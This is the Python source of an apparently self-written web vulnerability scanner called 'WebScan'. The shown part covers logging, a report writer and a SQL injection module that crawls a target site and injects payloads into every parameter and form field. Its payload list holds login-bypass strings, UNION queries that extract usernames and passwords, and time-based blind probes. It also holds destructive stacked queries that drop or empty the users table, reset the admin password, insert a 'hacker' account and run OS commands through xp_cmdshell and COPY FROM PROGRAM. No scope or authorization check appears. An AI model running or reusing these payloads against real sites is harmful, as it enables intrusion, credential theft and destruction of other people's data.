#!/usr/bin/env python3
"""
WebScan - Advanced Website Vulnerability Scanner (Standalone Version)

A comprehensive command-line tool for detecting various web vulnerabilities,
with multi-threaded scanning capabilities and detailed reporting.

This is a single-file version of WebScan, with all module code combined.
Developed by AMKUSH
"""

import argparse
import concurrent.futures
import sys
import time
import os
import re
import socket
import ssl
import json
import logging
import urllib.parse
from urllib.parse import urlparse, parse_qs, urljoin
from datetime import datetime
from typing import List, Dict, Any, Tuple, Optional, Union
import random
import string

# Third-party imports
import requests
from bs4 import BeautifulSoup
from colorama import init, Fore, Style

# Try to import trafilatura for better content extraction
try:
    import trafilatura
    TRAFILATURA_AVAILABLE = True
except ImportError:
    TRAFILATURA_AVAILABLE = False

# Initialize colorama for colored terminal output
init(autoreset=True)

# Global variables
USER_AGENT = "WebScan/1.0.0"
DEFAULT_TIMEOUT = 10

###########################################
# UTILITY FUNCTIONS
###########################################

def setup_logger(log_file='webscan.log', level=logging.INFO, no_color=False):
    """Set up the logger for the application."""
    logger = logging.getLogger('webscan')
    logger.setLevel(level)
    logger.handlers = []  # Clear existing handlers to avoid duplicates
    
    # Create console handler
    console_handler = logging.StreamHandler()
    console_handler.setLevel(level)
    
    # Create file handler
    file_handler = logging.FileHandler(log_file)
    file_handler.setLevel(level)
    
    # Create formatters
    if no_color:
        console_format = '[%(levelname)s] %(message)s'
    else:
        console_format = '%(colored_levelname)s %(message)s'
    file_format = '%(asctime)s - %(levelname)s - %(message)s'
    
    console_formatter = logging.Formatter(console_format)
    file_formatter = logging.Formatter(file_format)
    
    # Add formatters to handlers
    console_handler.setFormatter(console_formatter)
    file_handler.setFormatter(file_formatter)
    
    # Add handlers to logger
    logger.addHandler(console_handler)
    logger.addHandler(file_handler)
    
    # Custom formatter that adds colors
    def emit(self, record):
        record.colored_levelname = record.levelname
        if not no_color:
            if record.levelno == logging.INFO:
                record.colored_levelname = f"{Fore.BLUE}[INFO]{Style.RESET_ALL}"
            elif record.levelno == logging.WARNING:
                record.colored_levelname = f"{Fore.YELLOW}[WARNING]{Style.RESET_ALL}"
            elif record.levelno == logging.ERROR:
                record.colored_levelname = f"{Fore.RED}[ERROR]{Style.RESET_ALL}"
            elif record.levelno == logging.CRITICAL:
                record.colored_levelname = f"{Fore.RED}[CRITICAL]{Style.RESET_ALL}"
            elif record.levelno == logging.DEBUG:
                record.colored_levelname = f"{Fore.GREEN}[DEBUG]{Style.RESET_ALL}"
        
        logging.StreamHandler.emit(self, record)
    
    # Replace the emit method in the console handler
    console_handler.emit = lambda record: emit(console_handler, record)
    
    return logger

def is_url_accessible(url, timeout=10, user_agent=USER_AGENT):
    """Check if a URL is accessible."""
    headers = {
        'User-Agent': user_agent
    }
    
    try:
        response = requests.head(
            url, 
            headers=headers, 
            timeout=timeout,
            allow_redirects=True
        )
        
        # If HEAD request fails, try GET
        if response.status_code >= 400:
            response = requests.get(
                url, 
                headers=headers, 
                timeout=timeout,
                allow_redirects=True
            )
        
        return response.status_code < 400
    except Exception:
        return False

class Reporter:
    """Class to generate vulnerability scan reports."""
    
    def __init__(self, output_file='webscan_report.txt'):
        """
        Initialize the reporter.
        
        Args:
            output_file (str): Path to the output report file
        """
        self.output_file = output_file
        self.vulnerabilities = []
        self.target_url = None
        self.scan_types = []
        # Initialize start_time with current datetime to avoid None references
        self.start_time = datetime.now()
    
    def start_report(self, target_url, scan_types):
        """
        Start a new report.
        
        Args:
            target_url (str): The target URL being scanned
            scan_types (list): List of scan types being performed
        """
        self.target_url = target_url
        self.scan_types = scan_types
        # Reset the start time to the actual start of the scan
        self.start_time = datetime.now()
    
    def add_vulnerabilities(self, vulnerabilities):
        """
        Add vulnerabilities to the report.
        
        Args:
            vulnerabilities (list): List of vulnerability dictionaries
        """
        self.vulnerabilities.extend(vulnerabilities)
    
    def finalize_report(self, duration):
        """
        Generate the final report.
        
        Args:
            duration (float): Scan duration in seconds
            
        Returns:
            str: Path to the generated report file
        """
        # Ensure start_time is valid before formatting
        start_time_str = 'N/A'
        if self.start_time:
            start_time_str = self.start_time.strftime('%Y-%m-%d %H:%M:%S')
        
        report_data = {
            'scan_info': {
                'target_url': self.target_url,
                'scan_types': self.scan_types,
                'start_time': start_time_str,
                'duration': f"{duration:.2f} seconds",
                'vulnerabilities_found': len(self.vulnerabilities)
            },
            'vulnerabilities': self.vulnerabilities
        }
        
        # Sort vulnerabilities by severity
        severity_order = {'Critical': 0, 'High': 1, 'Medium': 2, 'Low': 3, 'Info': 4}
        self.vulnerabilities.sort(key=lambda x: severity_order.get(x.get('severity', 'Info'), 5))
        
        # Generate the report based on file extension
        file_ext = os.path.splitext(self.output_file)[1].lower()
        
        if file_ext == '.json':
            self._write_json_report(report_data)
        else:
            self._write_text_report(report_data)
        
        return self.output_file
    
    def _write_json_report(self, report_data):
        """
        Write the report in JSON format.
        
        Args:
            report_data (dict): Report data
        """
        try:
            with open(self.output_file, 'w') as f:
                json.dump(report_data, f, indent=2)
        except Exception as e:
            print(f"Error writing JSON report: {str(e)}")
            # Fallback to text report
            self._write_text_report(report_data)
    
    def _write_text_report(self, report_data):
        """
        Write the report in text format.
        
        Args:
            report_data (dict): Report data
        """
        try:
            with open(self.output_file, 'w') as f:
                # Header
                f.write("=" * 80 + "\n")
                f.write(f"WebScan Vulnerability Report\n")
                f.write(f"Developed by AMKUSH\n")
                f.write("=" * 80 + "\n\n")
                
                # Scan Information
                f.write("SCAN INFORMATION\n")
                f.write("-" * 80 + "\n")
                f.write(f"Target URL: {report_data['scan_info']['target_url']}\n")
                f.write(f"Scan Types: {', '.join(report_data['scan_info']['scan_types'])}\n")
                f.write(f"Start Time: {report_data['scan_info']['start_time']}\n")
                f.write(f"Duration: {report_data['scan_info']['duration']}\n")
                f.write(f"Vulnerabilities Found: {report_data['scan_info']['vulnerabilities_found']}\n\n")
                
                # Vulnerability Summary
                if report_data['vulnerabilities']:
                    severity_counts = {'Critical': 0, 'High': 0, 'Medium': 0, 'Low': 0, 'Info': 0}
                    
                    for vuln in report_data['vulnerabilities']:
                        severity = vuln.get('severity', 'Info')
                        severity_counts[severity] = severity_counts.get(severity, 0) + 1
                    
                    f.write("VULNERABILITY SUMMARY\n")
                    f.write("-" * 80 + "\n")
                    for severity, count in severity_counts.items():
                        if count > 0:
                            f.write(f"{severity}: {count}\n")
                    f.write("\n")
                
                # Detailed Vulnerabilities
                if report_data['vulnerabilities']:
                    f.write("DETAILED FINDINGS\n")
                    f.write("=" * 80 + "\n\n")
                    
                    # Group vulnerabilities by type
                    vuln_types = {}
                    for vuln in report_data['vulnerabilities']:
                        vuln_type = vuln.get('type', 'Unknown')
                        if vuln_type not in vuln_types:
                            vuln_types[vuln_type] = []
                        vuln_types[vuln_type].append(vuln)
                    
                    # Write each vulnerability type
                    for vuln_type, vulns in vuln_types.items():
                        f.write(f"{vuln_type}\n")
                        f.write("-" * len(vuln_type) + "\n")
                        
                        for i, vuln in enumerate(vulns):
                            if i > 0:
                                f.write("-" * 40 + "\n")
                            
                            f.write(f"Severity: {vuln.get('severity', 'Unknown')}\n")
                            
                            # URL
                            if 'url' in vuln:
                                f.write(f"URL: {vuln['url']}\n")
                            
                            # Details based on vulnerability type
                            if 'details' in vuln:
                                f.write(f"Details: {vuln['details']}\n")
                            
                            # Additional fields based on vulnerability type
                            if vuln_type == 'SQL Injection' or vuln_type == 'Cross-Site Scripting (XSS)':
                                if 'parameter' in vuln:
                                    f.write(f"Parameter: {vuln['parameter']}\n")
                                if 'payload' in vuln:
                                    f.write(f"Payload: {vuln['payload']}\n")
                            
                            elif vuln_type == 'Open Port':
                                if 'port' in vuln:
                                    f.write(f"Port: {vuln['port']}\n")
                                if 'service' in vuln:
                                    f.write(f"Service: {vuln['service']}\n")
                            
                            elif vuln_type == 'Directory Traversal':
                                if 'payload' in vuln:
                                    f.write(f"Payload: {vuln['payload']}\n")
                                if 'status_code' in vuln:
                                    f.write(f"Status Code: {vuln['status_code']}\n")
                            
                            elif vuln_type == 'Sensitive File Exposure':
                                if 'file_path' in vuln:
                                    f.write(f"File Path: {vuln['file_path']}\n")
                                if 'content_type' in vuln:
                                    f.write(f"Content Type: {vuln['content_type']}\n")
                                if 'content_length' in vuln:
                                    f.write(f"Content Length: {vuln['content_length']}\n")
                            
                            elif vuln_type == 'Missing Security Header' or vuln_type == 'Information Disclosure':
                                if 'header' in vuln:
                                    f.write(f"Header: {vuln['header']}\n")
                                if 'value' in vuln and 'header' in vuln:
                                    f.write(f"Value: {vuln['value']}\n")
                            
                            elif vuln_type == 'Insecure Protocol':
                                if 'protocol' in vuln:
                                    f.write(f"Protocol: {vuln['protocol']}\n")
                            
                            elif vuln_type == 'Weak Cipher':
                                if 'cipher' in vuln:
                                    f.write(f"Cipher: {vuln['cipher']}\n")
                            
                            # Recommendation if available
                            if 'recommendation' in vuln:
                                f.write(f"Recommendation: {vuln['recommendation']}\n")
                            
                            f.write("\n")
                        
                        f.write("\n")
                else:
                    f.write("No vulnerabilities were found.\n\n")
                
                # Footer
                f.write("=" * 80 + "\n")
                f.write(f"Report generated at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write("=" * 80 + "\n")
        
        except Exception as e:
            print(f"Error writing text report: {str(e)}")

###########################################
# SCANNER MODULES 
###########################################

class SQLInjectionScanner:
    """Scanner for detecting SQL Injection vulnerabilities."""
    
    def __init__(self, target_url, timeout=10, depth=2, user_agent="WebScan/1.0.0", logger=None, verbose=False):
        """
        Initialize the SQL Injection scanner.
        
        Args:
            target_url (str): The target URL to scan
            timeout (int): Request timeout in seconds
            depth (int): Scan depth level
            user_agent (str): User-Agent string to use in requests
            logger: Logger instance
            verbose (bool): Enable verbose output
        """
        self.target_url = target_url
        self.timeout = timeout
        self.depth = depth
        self.headers = {'User-Agent': user_agent}
        self.logger = logger
        self.verbose = verbose
        
        # SQL injection payloads to test - expanded with more aggressive techniques
        self.payloads = [
            # Basic authentication bypass
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR 1=1 --",
            "1' OR '1'='1",
            "admin' --",
            "' OR 1=1#",
            "' OR 1=1/*",
            "') OR ('1'='1--",
            "')) OR (('1'='1--",
            
            # Error-based SQL injection
            "' AND (SELECT 1 FROM (SELECT COUNT(*),concat(0x3a,(SELECT user()),0x3a,FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)a) --",
            "' AND (SELECT 2*IF((SELECT * FROM (SELECT CONCAT(0x3a,(SELECT user()),0x3a,0x3a)) s), 1, 0))-- -",
            "AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT table_name FROM information_schema.tables LIMIT 1)))",
            "AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x3a,user(),0x3a)) USING utf8)))",
            
            # Time-based blind SQL injection
            "' AND (SELECT * FROM (SELECT(SLEEP(1)))a) --",
            "' AND SLEEP(1) --",
            "' WAITFOR DELAY '0:0:3' --",
            "1' WAITFOR DELAY '0:0:3' --",
            "'; WAITFOR DELAY '0:0:3' --",
            "1); WAITFOR DELAY '0:0:3' --",
            "'; SELECT pg_sleep(3) --",
            "'; SELECT SLEEP(3) --",
            
            # Union-based SQL injection
            "' UNION SELECT null,null,null,null,null--",
            "' UNION SELECT 1,2,3,4,5--",
            "' UNION SELECT 1,2,3,4,@@version--",
            "' UNION SELECT username,password,3,4,5 FROM users--",
            "' UNION SELECT table_name,2,3,4,5 FROM information_schema.tables--",
            "' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x3a,0x3a,(SELECT table_name FROM information_schema.tables LIMIT 1),0x3a,0x3a)--",
            
            # Stacked queries
            "'; DROP TABLE users--",
            "'; INSERT INTO users (username,password) VALUES ('hacker','password')--",
            "'; UPDATE users SET password='hacked' WHERE username='admin'--",
            "'; DELETE FROM users--",
            
            # Database specific payloads
            # MySQL
            "' OR 1=1 -- -",
            "' OR 1=1 ORDER BY 10-- -",
            "' PROCEDURE ANALYSE()-- -",
            "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version)))-- -",
            
            # SQL Server
            "' OR 1=1 -- ",
            "'; EXEC xp_cmdshell('net user')-- ",
            "'; EXEC master..xp_cmdshell 'net user'-- ",
            
            # PostgreSQL
            "' OR 1=1; -- ",
            "'; SELECT pg_sleep(5)-- ",
            "'; CREATE TEMP TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'id'; SELECT * FROM cmd_exec; -- ",
            
            # Oracle
            "' OR 1=1 -- ",
            "' UNION SELECT banner FROM v$version-- ",
            "' UNION SELECT DISTINCT table_name FROM all_tables-- ",
            
            # SQLite
            "' OR 1=1 -- ",
            "' UNION SELECT sqlite_version()-- ",
            "' UNION SELECT group_concat(name) FROM sqlite_master WHERE type='table'-- "
        ]
        
        # Error patterns indicating successful SQL injection
        self.sql_error_patterns = [
            r"SQL syntax.*MySQL",
            r"Warning.*mysql_.*",
            r"MySQLSyntaxErrorException",
            r"valid MySQL result",
            r"check the manual that corresponds to your (MySQL|MariaDB) server version",
            r"ORA-[0-9][0-9][0-9][0-9]",
            r"Oracle error",
            r"Oracle.*Driver",
            r"Warning.*oci_.*",
            r"Microsoft SQL Server",
            r"ODBC SQL Server Driver",
            r"SQLServer JDBC Driver",
            r"SQLServerException",
            r"Unclosed quotation mark after the character string",
            r"SQLITE_ERROR",
            r"SQLite/JDBCDriver",
            r"SQLite\.Exception",
            r"System\.Data\.SQLite\.SQLiteException",
            r"PostgreSQL.*ERROR",
            r"Warning.*pg_.*",
            r"valid PostgreSQL result",
            r"Npgsql\.",
            r"PG::SyntaxError",
            r"DB2 SQL error",
            r"JDBC.*DB2",
            r"CLI Driver.*DB2"
        ]
        
        # Compile regex patterns
        self.compiled_patterns = [re.compile(pattern, re.IGNORECASE) for pattern in self.sql_error_patterns]
    
    def _extract_forms(self, url):
        """
        Extract all forms from a URL.
        
        Args:
            url (str): The URL to extract forms from
            
        Returns:
            list: List of dictionaries containing form details
        """
        try:
            response = requests.get(url, headers=self.headers, timeout=self.timeout)
            if response.status_code != 200:
                return []
                
            soup = BeautifulSoup(response.text, 'html.parser')
            forms = []
            
            for form in soup.find_all('form'):
                form_details = {}
                action = form.get('action', '')
                form_details['action'] = urljoin(url, action) if action else url
                form_details['method'] = form.get('method', 'get').lower()
                form_details['inputs'] = []
                
                for input_tag in form.find_all(['input', 'textarea']):
                    input_type = input_tag.get('type', 'text')
                    input_name = input_tag.get('name')
                    input_value = input_tag.get('value', '')
                    
                    if input_name:  # Only include inputs with names
                        form_details['inputs'].append({
                            'type': input_type,
                            'name': input_name,
                            'value': input_value
                        })
                
                forms.append(form_details)
            
            return forms
        except Exception as e:
            if self.logger:
                self.logger.error(f"Error extracting forms from {url}: {str(e)}")
            return []
    
    def _extract_parameters(self, url):
        """
        Extract GET parameters from a URL.
        
        Args:
            url (str): The URL to extract parameters from
            
        Returns:
            dict: Dictionary of parameters and values
        """
        parsed_url = urlparse(url)
        return parse_qs(parsed_url.query)
    
    def _scan_get_parameters(self, url):
        """
        Test URL GET parameters for SQL injection vulnerabilities.
        Uses aggressive error-based and time-based detection techniques.
        
        Args:
            url (str): The URL to test
            
        Returns:
            list: List of vulnerabilities found
        """
        vulnerabilities = []
        parameters = self._extract_parameters(url)
        if not parameters:
            return vulnerabilities
        
        if self.verbose and self.logger:
            self.logger.info(f"Testing GET parameters in URL: {url}")
        
        parsed_url = urlparse(url)
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
        
        # First check: standard error-based detection
        for param_name, param_values in parameters.items():
            for payload in self.payloads:
                test_url = f"{base_url}?{param_name}={payload}"
                
                # Add other parameters back
                for p_name, p_values in parameters.items():
                    if p_name != param_name:
                        test_url += f"&{p_name}={p_values[0]}"
                
                try:
                    if self.verbose and self.logger:
                        self.logger.info(f"Testing payload on parameter '{param_name}': {payload}")
                    
                    response = requests.get(
                        test_url, 
                        headers=self.headers, 
                        timeout=self.timeout,
                        allow_redirects=False
                    )
                    
                    # Check for SQL error patterns in response
                    if self._check_sql_errors(response.text):
                        detail = f"Parameter '{param_name}' is vulnerable to SQL injection using payload: {payload}"
                        vulnerability = {
                            'type': 'SQL Injection',
                            'url': url,
                            'method': 'GET',
                            'parameter': param_name,
                            'payload': payload,
                            'details': detail,
                            'severity': 'High',
                            'evidence': 'Error-based detection'
                        }
                        vulnerabilities.append(vulnerability)
                        
                        if self.logger:
                            self.logger.warning(f"SQL Injection found: {detail}")
                        
                        # No need to test more payloads for this parameter
                        break
                
                except Exception as e:
                    if self.logger:
                        self.logger.error(f"Error testing GET parameter '{param_name}': {str(e)}")
        
        # Second check: Enhanced time-based blind detection with our advanced method
        # Only perform if no error-based vulnerabilities found
        if not any(v['parameter'] == param_name for v in vulnerabilities for param_name in parameters.keys()):
            for param_name, param_values in parameters.items():
                if self.verbose and self.logger:
                    self.logger.info(f"Testing parameter '{param_name}' for time-based blind SQL injection")
                
                # Use our advanced time-based detection method
                is_vulnerable, payload, time_diff = self._detect_time_based_sqli(url, param_name=param_name)
                
                if is_vulnerable:
                    detail = f"Parameter '{param_name}' is vulnerable to time-based blind SQL injection using payload: {payload}"
                    vulnerability = {
                        'type': 'SQL Injection',
                        'url': url,
                        'method': 'GET',
                        'parameter': param_name,
                        'payload': payload,
                        'details': detail,
                        'timing': f"Response delayed by {time_diff:.2f} seconds",
                        'severity': 'High',
                        'recommendation': "Parameterize all database queries and implement proper input validation"
                    }
                    vulnerabilities.append(vulnerability)
                    
                    if self.logger:
                        self.logger.warning(f"Time-based SQL injection found: {detail}")
                    
                    # No need to test more parameters once we've found a vulnerability
                    break
                    
        return vulnerabilities

    def _scan_form(self, form_details, url):
        """
        Test a form for SQL injection vulnerabilities.
        Uses aggressive techniques including error-based and time-based detection.
        
        Args:
            form_details (dict): Form details including inputs
            url (str): The URL containing the form
            
        Returns:
            list: List of vulnerabilities found
        """
        vulnerabilities = []
        action = form_details["action"]
        method = form_details["method"]
        inputs = form_details["inputs"]
        
        if self.verbose and self.logger:
            self.logger.info(f"Testing form on {url} with action {action} using method {method}")
        
        # First check: Test each input field for error-based SQL injection
        for input_field in inputs:
            # Skip non-text inputs like submit buttons, checkboxes, etc.
            if input_field["type"] not in ["text", "search", "email", "url", "password"]:
                continue
                
            input_name = input_field["name"]
            original_value = input_field["value"]
            
            for payload in self.payloads:
                # Clone the inputs dictionary
                data = {}
                for inp in inputs:
                    # Use the original value for all fields except the one being tested
                    if inp["name"] != input_name:
                        data[inp["name"]] = inp["value"]
                    else:
                        data[inp["name"]] = payload
                
                try:
                    if self.verbose and self.logger:
                        self.logger.info(f"Testing form field '{input_name}' with payload: {payload}")
                    
                    if method == "post":
                        response = requests.post(
                            action, 
                            data=data, 
                            headers=self.headers, 
                            timeout=self.timeout,
                            allow_redirects=False
                        )
                    else:  # method == "get"
                        response = requests.get(
                            action, 
                            params=data, 
                            headers=self.headers, 
                            timeout=self.timeout,
                            allow_redirects=False
                        )
                    
                    # Check for SQL error patterns in response
                    if self._check_sql_errors(response.text):
                        detail = f"Form field '{input_name}' is vulnerable to SQL injection using payload: {payload}"
                        vulnerability = {
                            'type': 'SQL Injection',
                            'url': url,
                            'method': method.upper(),
                            'parameter': input_name,
                            'payload': payload,
                            'details': detail,
                            'severity': 'High',
                            'evidence': 'Error-based detection'
                        }
                        vulnerabilities.append(vulnerability)
                        
                        if self.logger:
                            self.logger.warning(f"SQL Injection found: {detail}")
                        
                        # No need to test more payloads for this input
                        break
                
                except Exception as e:
                    if self.logger:
                        self.logger.error(f"Error testing form field '{input_name}': {str(e)}")
        
        # Second check: Test each input field for time-based blind SQL injection
        # Only perform if no error-based vulnerabilities found
        if not vulnerabilities:
            for input_field in inputs:
                # Skip non-text inputs
                if input_field["type"] not in ["text", "search", "email", "url", "password"]:
                    continue
                
                input_name = input_field["name"]
                
                if self.verbose and self.logger:
                    self.logger.info(f"Testing form field '{input_name}' for time-based blind SQL injection")
                
                # Use our advanced time-based detection method
                is_vulnerable, payload, time_diff = self._detect_time_based_sqli(
                    url_or_form=action,
                    form_details=form_details,
                    input_field=input_field
                )
                
                if is_vulnerable:
                    detail = f"Form field '{input_name}' is vulnerable to time-based blind SQL injection using payload: {payload}"
                    vulnerability = {
                        'type': 'SQL Injection',
                        'url': url,
                        'method': method.upper(),
                        'parameter': input_name,
                        'payload': payload,
                        'details': detail,
                        'timing': f"Response delayed by {time_diff:.2f} seconds",
                        'severity': 'High',
                        'recommendation': "Parameterize all database queries and implement proper input validation"
                    }
                    vulnerabilities.append(vulnerability)
                    
                    if self.logger:
                        self.logger.warning(f"Time-based SQL injection found: {detail}")
                    
                    # No need to test more inputs once we've found a vulnerability
                    break
        
        return vulnerabilities

    def _detect_time_based_sqli(self, url_or_form, param_name=None, form_details=None, input_field=None):
        """
        Advanced detection for time-based blind SQL injection vulnerabilities.
        This method attempts multiple sophisticated payloads and analyzes response times
        to identify potential blind SQL injection points.
        
        Args:
            url_or_form (str): The URL to test or form action URL
            param_name (str, optional): The GET parameter name to test
            form_details (dict, optional): Form details if testing a form
            input_field (dict, optional): Input field details if testing a form field
            
        Returns:
            tuple: (is_vulnerable, payload, time_diff) or (False, None, 0) if not vulnerable
        """
        # Database-specific time-based payloads
        time_payloads = [
            # MySQL (shorter delays for better UX while maintaining detection)
            "1' AND (SELECT * FROM (SELECT(SLEEP(2)))a)-- -",
            "' AND (SELECT * FROM (SELECT(SLEEP(2)))a)-- -",
            "\" AND (SELECT * FROM (SELECT(SLEEP(2)))a)-- -",
            "') AND (SELECT * FROM (SELECT(SLEEP(2)))a)-- -",
            "1)) AND (SELECT * FROM (SELECT(SLEEP(2)))a)-- -",
            
            # PostgreSQL 
            "1'; SELECT CASE WHEN (1=1) THEN pg_sleep(2) ELSE pg_sleep(0) END-- -",
            "'; SELECT CASE WHEN (1=1) THEN pg_sleep(2) ELSE pg_sleep(0) END-- -",
            "\"; SELECT CASE WHEN (1=1) THEN pg_sleep(2) ELSE pg_sleep(0) END-- -",
            
            # SQL Server
            "1'; WAITFOR DELAY '0:0:2'-- -",
            "'; WAITFOR DELAY '0:0:2'-- -",
            "\"; WAITFOR DELAY '0:0:2'-- -",
            "1); WAITFOR DELAY '0:0:2'-- -",
            "'); WAITFOR DELAY '0:0:2'-- -",
            
            # Oracle (using heavy queries for time delay)
            "1' AND 1=(SELECT COUNT(*) FROM ALL_USERS T1, ALL_USERS T2, ALL_USERS T3)-- -",
            "' AND 1=(SELECT COUNT(*) FROM ALL_USERS T1, ALL_USERS T2, ALL_USERS T3)-- -",
            
            # SQLite (using heavy queries for time delay)
            "1' AND 1=like('ABCDEFG',repeat('ABCDEFG',3000000))-- -",
            "' AND 1=like('ABCDEFG',repeat('ABCDEFG',3000000))-- -"
        ]
        
        is_form = form_details is not None and input_field is not None
        
        # Control request (non-payload) to establish baseline response time
        try:
            start_time = time.time()
            
            if is_form:
                method = form_details['method']
                action = url_or_form
                
                # Clone the inputs dictionary
                data = {}
                for inp in form_details['inputs']:
                    # Use the original value for all fields
                    data[inp['name']] = inp['value']
                
                if method == 'post':
                    response = requests.post(
                        action, 
                        data=data, 
                        headers=self.headers, 
                        timeout=self.timeout,
                        allow_redirects=False
                    )
                else:  # method == "get"
                    response = requests.get(
                        action, 
                        params=data, 
                        headers=self.headers, 
                        timeout=self.timeout,
                        allow_redirects=False
                    )
            
            else:  # GET parameter case
                parsed_url = urlparse(url_or_form)
                base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
                parameters = self._extract_parameters(url_or_form)
                
                # Create control URL
                control_url = base_url
                if parameters:
                    control_url += '?'
                    for p_name, p_values in parameters.items():
                        control_url += f"{p_name}={p_values[0]}&"
                    control_url = control_url[:-1]  # Remove trailing &
                
                response = requests.get(
                    control_url,
                    headers=self.headers,
                    timeout=self.timeout,
                    allow_redirects=False
                )
            
            end_time = time.time()
            baseline_time = end_time - start_time
            
            # Account for network jitter by adding a buffer to baseline
            # e.g., multiply by 1.5 to set threshold 50% above baseline
            time_threshold = max(baseline_time * 2, 1.5)  # At least 1.5 seconds difference
            
            if self.verbose and self.logger:
                self.logger.info(f"Baseline response time: {baseline_time:.2f}s, Threshold: {time_threshold:.2f}s")
            
            # Test different time-based payloads
            for payload in time_payloads:
                try:
                    if is_form:
                        method = form_details['method']
                        action = url_or_form
                        input_name = input_field['name']
                        
                        # Clone inputs and replace test field with payload
                        data = {}
                        for inp in form_details['inputs']:
                            # Use the original value for all fields except the one being tested
                            if inp['name'] != input_name:
                                data[inp['name']] = inp['value']
                            else:
                                data[inp['name']] = payload
                        
                        start_time = time.time()
                        
                        if method == 'post':
                            response = requests.post(
                                action, 
                                data=data, 
                                headers=self.headers, 
                                timeout=max(self.timeout, 10),  # Ensure timeout is long enough
                                allow_redirects=False
                            )
                        else:  # method == "get"
                            response = requests.get(
                                action, 
                                params=data, 
                                headers=self.headers, 
                                timeout=max(self.timeout, 10),
                                allow_redirects=False
                            )
                    
                    else:  # GET parameter case
                        parsed_url = urlparse(url_or_form)
                        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
                        
                        # Create test URL with payload
                        test_url = f"{base_url}?{param_name}={payload}"
                        
                        # Add other parameters back
                        parameters = self._extract_parameters(url_or_form)
                        for p_name, p_values in parameters.items():
                            if p_name != param_name:
                                test_url += f"&{p_name}={p_values[0]}"
                        
                        start_time = time.time()
                        response = requests.get(
                            test_url,
                            headers=self.headers,
                            timeout=max(self.timeout, 10),
                            allow_redirects=False
                        )
                    
                    end_time = time.time()
                    time_diff = end_time - start_time
                    
                    if self.verbose and self.logger:
                        self.logger.info(f"Payload response time: {time_diff:.2f}s, Threshold: {time_threshold:.2f}s")
                    
                    # If the response took significantly longer than baseline (above threshold)
                    if time_diff > time_threshold:
                        # Perform a second control request to confirm it wasn't a network issue
                        start_time = time.time()
                        
                        if is_form:
                            method = form_details['method']
                            action = url_or_form
                            
                            # Clone the inputs dictionary (original values)
                            data = {}
                            for inp in form_details['inputs']:
                                data[inp['name']] = inp['value']
                            
                            if method == 'post':
                                requests.post(
                                    action, 
                                    data=data, 
                                    headers=self.headers, 
                                    timeout=self.timeout,
                                    allow_redirects=False
                                )
                            else:  # method == "get"
                                requests.get(
                                    action, 
                                    params=data, 
                                    headers=self.headers, 
                                    timeout=self.timeout,
                                    allow_redirects=False
                                )
                        
                        else:  # GET parameter case
                            parsed_url = urlparse(url_or_form)
                            base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
                            parameters = self._extract_parameters(url_or_form)
                            
                            # Create control URL
                            control_url = base_url
                            if parameters:
                                control_url += '?'
                                for p_name, p_values in parameters.items():
                                    control_url += f"{p_name}={p_values[0]}&"
                                control_url = control_url[:-1]  # Remove trailing &
                            
                            requests.get(
                                control_url,
                                headers=self.headers,
                                timeout=self.timeout,
                                allow_redirects=False
                            )
                        
                        end_time = time.time()
                        second_control_time = end_time - start_time
                        
                        # If second control is much faster, it confirms the time-based injection
                        if time_diff > (second_control_time * 1.5) and (time_diff - second_control_time) > 1.0:
                            return True, payload, time_diff
                
                except Exception as e:
                    if self.logger:
                        self.logger.error(f"Error during time-based detection: {str(e)}")
                    continue
        
        except Exception as e:
            if self.logger:
                self.logger.error(f"Error during time-based detection setup: {str(e)}")
        
        return False, None, 0

    def _check_sql_errors(self, response_content):
        """
        Check if the response contains SQL error messages.
        Uses aggressive pattern matching to identify even subtle error indications.
        
        Args:
            response_content (str): The response content to check
            
        Returns:
            bool: True if SQL error patterns are found, False otherwise
        """
        # Check response for SQL errors using compiled regex patterns
        for pattern in self.compiled_patterns:
            if pattern.search(response_content):
                return True
        
        return False

    def scan(self):
        """
        Start the SQL injection vulnerability scan.
        
        Returns:
            list: List of vulnerabilities found
        """
        vulnerabilities = []
        
        if self.logger:
            self.logger.info(f"Starting SQL injection scan on {self.target_url}")
        
        try:
            # Scan GET parameters in the base URL
            get_vulnerabilities = self._scan_get_parameters(self.target_url)
            vulnerabilities.extend(get_vulnerabilities)
            
            # Extract and scan forms
            forms = self._extract_forms(self.target_url)
            for form in forms:
                form_vulnerabilities = self._scan_form(form, self.target_url)
                vulnerabilities.extend(form_vulnerabilities)
            
            # Additional crawling for more complex scanning if required by depth
            if self.depth > 1:
                # Extract links from the target page up to the depth level
                try:
                    response = requests.get(self.target_url, headers=self.headers, timeout=self.timeout)
                    soup = BeautifulSoup(response.text, 'html.parser')
                    
                    # Find all links on the page
                    links = []
                    for a_tag in soup.find_all('a', href=True):
                        link = urljoin(self.target_url, a_tag['href'])
                        # Only include links on the same domain
                        target_domain = urlparse(self.target_url).netloc
                        link_domain = urlparse(link).netloc
                        
                        if link_domain == target_domain and link not in links:
                            links.append(link)
                    
                    # Limit the number of links to scan based on depth
                    max_links = min(len(links), 5 * self.depth)  # e.g., depth 2 = 10 links
                    links = links[:max_links]
                    
                    if self.verbose and self.logger:
                        self.logger.info(f"Found {len(links)} links, scanning {max_links}")
                    
                    # Scan each link
                    for link in links:
                        if self.verbose and self.logger:
                            self.logger.info(f"Scanning link: {link}")
                        
                        # Scan GET parameters
                        get_vulnerabilities = self._scan_get_parameters(link)
                        vulnerabilities.extend(get_vulnerabilities)
                        
                        # Scan forms
                        forms = self._extract_forms(link)
                        for form in forms:
                            form_vulnerabilities = self._scan_form(form, link)
                            vulnerabilities.extend(form_vulnerabilities)
                
                except Exception as e:
                    if self.logger:
                        self.logger.error(f"Error during link crawling: {str(e)}")
        
        except Exception as e:
            if self.logger:
                self.logger.error(f"Error during SQL injection scan: {str(e)}")
        
        if self.logger:
            self.logger.info(f"Completed SQL injection scan, found {len(vulnerabilities)} vulnerabilities")
        
        return vulnerabilities

###########################################
